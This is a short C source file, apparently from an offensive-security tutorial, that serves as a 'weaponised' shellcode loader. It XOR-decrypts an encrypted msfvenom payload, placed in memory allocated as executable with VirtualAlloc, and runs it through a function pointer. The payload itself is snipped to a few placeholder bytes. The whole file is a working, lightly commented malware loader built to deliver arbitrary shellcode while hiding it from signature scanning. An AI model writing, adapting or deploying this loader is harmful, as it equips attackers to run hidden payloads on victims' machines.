/* The below code makes two entensions on the basic decryptor temmplate
First, it decrypts the msfvenom payload, rather than 'test'
Second, it utilises Windows APIs to execute the shellcode*/

#include <stdio.h>
// Windows.h necessary in this weaponised version for the shellcode execution
#include <Windows.h>

unsigned char code[] = "\xb7\x03\xc8\xaf\xbb\xa3";
/* The above is our encrypted shellcode.Again, the actual payload will be
much longer, the above is snipped */

int main()
{
	//comments for the below can be seen in the basic template
	char key = 'K';
	int i = 0;
	for (i; i < sizeof(code) - 1; i++)
	{
		code[i] = code[i] ^ key;
	}

	//We will utilise the windows APIs to execute the shellcode in this template

	//The Below code does a number of things:
	
	/*First, VirtualAlloc allocates memory for later use, in this case with the
	PAGE_EXECUTE_READWRITE protection, indicating that the memory can be executed */
	
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	/*Next, memcpy copies our decrypted shellcode to the allocated memory where it
	can be executed */
	memcpy(exec, code, sizeof code);

	/* Finally, the last line casts the allocated memory as a function pointer and executes it
	*/
	((void(*)())exec)();

	return 0;

}